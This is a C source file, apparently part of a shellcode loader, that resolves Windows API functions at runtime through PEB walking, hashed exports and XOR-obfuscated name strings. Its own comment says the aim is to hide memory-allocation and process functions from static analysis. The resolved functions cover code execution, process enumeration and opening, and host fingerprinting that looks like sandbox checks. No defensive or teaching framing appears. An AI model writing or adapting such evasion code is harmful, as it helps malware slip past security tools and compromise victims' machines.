/*
 * Dynamic Win32 API Resolution
 *
 * Resolves all Win32 functions at runtime using only two imports:
 * GetModuleHandleA and GetProcAddress (from kernel32).
 * These two are resolved via PEB walking (api_hash.c), so even they
 * don't need to be in the IAT if we compile with -nostdlib.
 *
 * Result: the IAT is clean — no VirtualAlloc, no LoadLibrary, nothing
 * that screams "shellcode loader" to static analysis.
 */

#include "winapi.h"
#include "obfstr.h"
#include "api_hash.h"

WIN_API g_Api = {0};

/* Resolve a function from a module using obfuscated name */
static FARPROC Resolve(HMODULE mod, const unsigned char *obf, int len) {
    char buf[64];
    if (len > 63) return NULL;
    deobf(buf, obf, len);
    FARPROC p = g_Api.pGetProcAddress(mod, buf);
    SecureZeroMemory(buf, sizeof(buf));
    return p;
}

BOOL WinApiInit(void) {
    /* Step 1: Get kernel32 base via PEB walking (no imports needed) */
    char s_k32[OBF_KERNEL32_LEN];
    deobf(s_k32, OBF_KERNEL32, OBF_KERNEL32_LEN);

    /* Use djb2 hash to find GetProcAddress in kernel32 exports */
    g_Api.pGetProcAddress = (fnGetProcAddress)GetFuncByHash(0xcf31bb1f);
    if (!g_Api.pGetProcAddress) return FALSE;

    g_Api.pGetModuleHandleA = (fnGetModuleHandleA)GetFuncByHash(0x5a153f58);
    if (!g_Api.pGetModuleHandleA) return FALSE;

    HMODULE k32 = g_Api.pGetModuleHandleA(s_k32);
    SecureZeroMemory(s_k32, sizeof(s_k32));
    if (!k32) return FALSE;

    /* Step 2: Resolve everything else from kernel32 */
    static const unsigned char OBF_VA[] = {
        0x03,0x3C,0x27,0x21,0x20,0x34,0x39,0x14,0x39,0x39,0x3A,0x36,0x55
    };
    g_Api.pVirtualAlloc = (fnVirtualAlloc)Resolve(k32, OBF_VA, 13);

    static const unsigned char OBF_VF[] = {
        0x03,0x3C,0x27,0x21,0x20,0x34,0x39,0x13,0x27,0x30,0x30,0x55
    };
    g_Api.pVirtualFree = (fnVirtualFree)Resolve(k32, OBF_VF, 12);

    static const unsigned char OBF_VP[] = {
        0x03,0x3C,0x27,0x21,0x20,0x34,0x39,0x05,0x27,0x3A,0x21,0x30,0x36,0x21,0x55
    };
    g_Api.pVirtualProtect = (fnVirtualProtect)Resolve(k32, OBF_VP, 15);

    static const unsigned char OBF_LLA[] = {
        0x19,0x3A,0x34,0x31,0x19,0x3C,0x37,0x27,0x34,0x27,0x2C,0x14,0x55
    };
    g_Api.pLoadLibraryA = (fnLoadLibraryA)Resolve(k32, OBF_LLA, 13);

    static const unsigned char OBF_FL[] = {
        0x13,0x27,0x30,0x30,0x19,0x3C,0x37,0x27,0x34,0x27,0x2C,0x55
    };
    g_Api.pFreeLibrary = (fnFreeLibrary)Resolve(k32, OBF_FL, 12);

    static const unsigned char OBF_CE[] = {
        0x16,0x27,0x30,0x34,0x21,0x30,0x10,0x23,0x30,0x3B,0x21,0x14,0x55
    };
    g_Api.pCreateEventA = (fnCreateEventA)Resolve(k32, OBF_CE, 13);

    static const unsigned char OBF_WFSO[] = {
        0x02,0x34,0x3C,0x21,0x13,0x3A,0x27,0x06,0x3C,0x3B,0x32,0x39,0x30,0x1A,0x37,0x3F,0x30,0x36,0x21,0x10,0x2D,0x55
    };
    g_Api.pWaitForSingleObjectEx = (fnWaitForSingleObjectEx)Resolve(k32, OBF_WFSO, 22);

    static const unsigned char OBF_CH[] = {
        0x16,0x39,0x3A,0x26,0x30,0x1D,0x34,0x3B,0x31,0x39,0x30,0x55
    };
    g_Api.pCloseHandle = (fnCloseHandle)Resolve(k32, OBF_CH, 12);

    static const unsigned char OBF_CFW[] = {
        0x16,0x27,0x30,0x34,0x21,0x30,0x13,0x3C,0x39,0x30,0x02,0x55
    };
    g_Api.pCreateFileW = (fnCreateFileW)Resolve(k32, OBF_CFW, 12);

    static const unsigned char OBF_CFMW[] = {
        0x16,0x27,0x30,0x34,0x21,0x30,0x13,0x3C,0x39,0x30,0x18,0x34,0x25,0x25,0x3C,0x3B,0x32,0x02,0x55
    };
    g_Api.pCreateFileMappingW = (fnCreateFileMappingW)Resolve(k32, OBF_CFMW, 19);

    static const unsigned char OBF_MVF[] = {
        0x18,0x34,0x25,0x03,0x3C,0x30,0x22,0x1A,0x33,0x13,0x3C,0x39,0x30,0x55
    };
    g_Api.pMapViewOfFile = (fnMapViewOfFile)Resolve(k32, OBF_MVF, 14);

    static const unsigned char OBF_UMVF[] = {
        0x00,0x3B,0x38,0x34,0x25,0x03,0x3C,0x30,0x22,0x1A,0x33,0x13,0x3C,0x39,0x30,0x55
    };
    g_Api.pUnmapViewOfFile = (fnUnmapViewOfFile)Resolve(k32, OBF_UMVF, 16);

    static const unsigned char OBF_GCN[] = {
        0x12,0x30,0x21,0x16,0x3A,0x38,0x25,0x20,0x21,0x30,0x27,0x1B,0x34,0x38,0x30,0x14,0x55
    };
    g_Api.pGetComputerNameA = (fnGetComputerNameA)Resolve(k32, OBF_GCN, 17);

    static const unsigned char OBF_SLP[] = {
        0x06,0x39,0x30,0x30,0x25,0x55
    };
    g_Api.pSleep = (fnSleep)Resolve(k32, OBF_SLP, 6);

    /* advapi32 for GetUserNameA */
    char s_adv[OBF_ADVAPI32_LEN];
    deobf(s_adv, OBF_ADVAPI32, OBF_ADVAPI32_LEN);
    HMODULE adv = g_Api.pLoadLibraryA(s_adv);
    SecureZeroMemory(s_adv, sizeof(s_adv));

    if (adv) {
        static const unsigned char OBF_GUN[] = {
            0x12,0x30,0x21,0x00,0x26,0x30,0x27,0x1B,0x34,0x38,0x30,0x14,0x55
        };
        g_Api.pGetUserNameA = (fnGetUserNameA)Resolve(adv, OBF_GUN, 13);
    }

    static const unsigned char OBF_GEVA[] = {
        0x12,0x30,0x21,0x10,0x3B,0x23,0x3C,0x27,0x3A,0x3B,0x38,0x30,0x3B,0x21,0x03,0x34,0x27,0x3C,0x34,0x37,0x39,0x30,0x14,0x55
    };
    g_Api.pGetEnvironmentVariableA = (fnGetEnvironmentVariableA)Resolve(k32, OBF_GEVA, 24);

    /* CreateProcessA - XOR 0x55 of "CreateProcessA" */
    static const unsigned char OBF_CPA[] = {
        0x16,0x27,0x30,0x34,0x21,0x30,0x05,0x27,0x3A,0x36,0x30,0x26,0x26,0x14,0x55
    };
    g_Api.pCreateProcessA = (fnCreateProcessA)Resolve(k32, OBF_CPA, 15);

    static const unsigned char OBF_WE[] = {
        0x02,0x3C,0x3B,0x10,0x2D,0x30,0x36,0x55
    };
    g_Api.pWinExec = (fnWinExec)Resolve(k32, OBF_WE, 8);

    /* "GetSystemInfo\0" XOR 0x55 */
    static const unsigned char OBF_GSI[] = {
        0x12,0x30,0x21,0x06,0x2C,0x26,0x21,0x30,0x38,0x1C,0x3B,0x33,0x3A,0x55
    };
    g_Api.pGetSystemInfo = (fnGetSystemInfo)Resolve(k32, OBF_GSI, 14);

    /* "GlobalMemoryStatusEx\0" XOR 0x55 */
    static const unsigned char OBF_GMSE[] = {
        0x12,0x39,0x3A,0x37,0x34,0x39,0x18,0x30,0x38,0x3A,0x27,0x2C,0x06,0x21,0x34,0x21,0x20,0x26,0x10,0x2D,0x55
    };
    g_Api.pGlobalMemoryStatusEx = (fnGlobalMemoryStatusEx)Resolve(k32, OBF_GMSE, 21);

    /* "GetTickCount64\0" XOR 0x55 */
    static const unsigned char OBF_GTC[] = {
        0x12,0x30,0x21,0x01,0x3C,0x36,0x3E,0x16,0x3A,0x20,0x3B,0x21,0x63,0x61,0x55
    };
    g_Api.pGetTickCount64 = (fnGetTickCount64)Resolve(k32, OBF_GTC, 15);

    /* "CreateToolhelp32Snapshot\0" XOR 0x55 */
    static const unsigned char OBF_CT32S[] = {
        0x16,0x27,0x30,0x34,0x21,0x30,0x01,0x3A,0x3A,0x39,0x3D,0x30,0x39,0x25,0x66,0x67,0x06,0x3B,0x34,0x25,0x26,0x3D,0x3A,0x21,0x55
    };
    g_Api.pCreateToolhelp32Snapshot = (fnCreateToolhelp32Snapshot)Resolve(k32, OBF_CT32S, 25);

    /* "Process32FirstW\0" XOR 0x55 */
    static const unsigned char OBF_P32F[] = {
        0x05,0x27,0x3A,0x36,0x30,0x26,0x26,0x66,0x67,0x13,0x3C,0x27,0x26,0x21,0x02,0x55
    };
    g_Api.pProcess32FirstW = (fnProcess32FirstW)Resolve(k32, OBF_P32F, 16);

    /* "Process32NextW\0" XOR 0x55 */
    static const unsigned char OBF_P32N[] = {
        0x05,0x27,0x3A,0x36,0x30,0x26,0x26,0x66,0x67,0x1B,0x30,0x2D,0x21,0x02,0x55
    };
    g_Api.pProcess32NextW = (fnProcess32NextW)Resolve(k32, OBF_P32N, 15);

    /* "OpenProcess\0" XOR 0x55 */
    static const unsigned char OBF_OP[] = {
        0x1A,0x25,0x30,0x3B,0x05,0x27,0x3A,0x36,0x30,0x26,0x26,0x55
    };
    g_Api.pOpenProcess = (fnOpenProcess)Resolve(k32, OBF_OP, 12);

    return TRUE;
}
